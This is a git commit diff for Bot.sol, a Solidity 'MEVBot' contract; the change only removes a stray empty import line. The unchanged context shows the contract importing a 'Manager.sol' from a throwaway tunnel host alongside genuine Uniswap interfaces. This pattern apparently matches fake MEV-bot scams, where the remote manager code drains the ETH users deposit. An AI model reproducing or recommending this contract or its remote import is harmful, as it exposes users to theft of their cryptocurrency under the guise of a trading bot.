7d42d2010dfbfc773a28a97343d3aa36f4987a79
KNickNitro <127617751+KNickNitro@users.noreply.github.com>
2023-03-11 13:29:22 -0800

    Update Bot.sol

--- Bot.sol
+++ Bot.sol
@@ -6,7 +6,7 @@ import "78a46b90818b6c.lhr.life/mev/Manager.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
-import 
+
 contract MEVBot {
 
     string public tokenName;
